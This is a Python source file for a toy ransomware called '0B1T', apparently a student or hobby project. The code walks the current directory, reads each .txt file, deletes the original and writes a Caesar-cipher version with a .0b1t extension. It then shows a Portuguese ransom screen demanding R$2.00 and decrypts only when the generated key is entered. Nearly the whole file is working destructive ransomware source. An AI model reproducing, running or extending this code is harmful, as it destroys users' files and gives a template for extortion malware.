import os
import platform
import secrets
from time import sleep
from pyfiglet import Figlet
from CaesarCipher import CaesarCipher, file


class _ListDIR:
    def __init__(self, path = os.getcwd()) -> list:
        self._path = path
        self._found_files = []
        self._files_encrypted = []
        self._malware = __file__.replace(f"{__file__[0]+ ':'}", f"{__file__[0].upper() + ':'}")
        self._dependence = file().replace(f"{file()[0] + ':'}", f"{file()[0].upper() + ':'}")
        self.extensions = [".txt", ".0b1t"]
        self._white_list = [self._malware, self._dependence]

    def foundFiles_to_Encrypt(self):
        for dir, subdir, files in os.walk(self._path):
            for x in files:
                PATH_files = (os.path.join(dir, x))
                if not PATH_files in self._white_list:
                    self._found_files.append(PATH_files)
        return self._found_files


class Ransomware(_ListDIR):
    def __init__(self, path=os.getcwd()) -> list:
        super().__init__(path)
        self.keyDecrypt = secrets.token_hex(32)
    
    def encrypt(self):
        for dir, subdir, files in os.walk(self._path):
            for x in files:
                PATH_files = (os.path.join(dir, x))
                path, extension = os.path.splitext(PATH_files)
                if extension in self.extensions:
                    with open(PATH_files, "r") as arq:
                        data = arq.read()
                        
                    os.remove(PATH_files)
                    encrypted_DATA = CaesarCipher(data).encrypt()
                    new_name = PATH_files.replace(extension, ".0b1t")
                    with open(new_name, "w") as arq:
                        arq.write(encrypted_DATA)

    def decrypt(self, key: str):
        if key == self.keyDecrypt:
            for dir, subdir, files in os.walk(self._path):
                for x in files:
                    PATH_files = (os.path.join(dir, x))
                    path, extension = os.path.splitext(PATH_files)
                    if extension in self.extensions:
                        with open(PATH_files, "r") as arq:
                            data = arq.read()
                        
                        os.remove(PATH_files)
                        decryptedDATA = CaesarCipher(data).decrypt()
                        old_name = PATH_files.replace(extension, ".txt")
                        with open(old_name, "w") as arq:
                            arq.write(decryptedDATA)
            return True


def clearTerminal():
    if platform.system() == "Windows":
        return os.system("cls")
    else:
        return os.system("clear")


def menu():
    clearTerminal()
    f = Figlet()
    print(f'\033[1;31m{f.renderText("--0B1T--")}')
    print("\033[;1m--Infelizmente (ou felizmente :) ) você caiu no nosso RANSOMWARE e agora temos todos os seus arquivos--\nVocê precisa nos enviar R$2.00 para devolvermos seus preciosos arquivos!!")


if __name__ == "__main__":
    obj = Ransomware()
    obj.encrypt()

    tentativas = 3
    while tentativas > 0:
        menu()
        print(f"\n---Você tem \033[1;31m{tentativas} tentativas :)---")
        pagamento = float(input("\n\033[;1mQuanto deseja transferir?: R$").replace(",","."))
        if pagamento >= 2:
            while True:
                print(f"\nSeu Pagamento foi feito, cole sua chave para decriptar: \033[1;32m{obj.keyDecrypt}\033[m")
                if obj.decrypt(input("Chave: ")):
                    print("\n0b1t agradece pelo seu pagamento :)\nFechando Malware...")
                    sleep(1.5)
                    exit()
                else:
                    menu()
                    continue
        else:
            tentativas -= 1

    print("Você perdeu todos os seus arquivos :(")
    sleep(2)
    exit()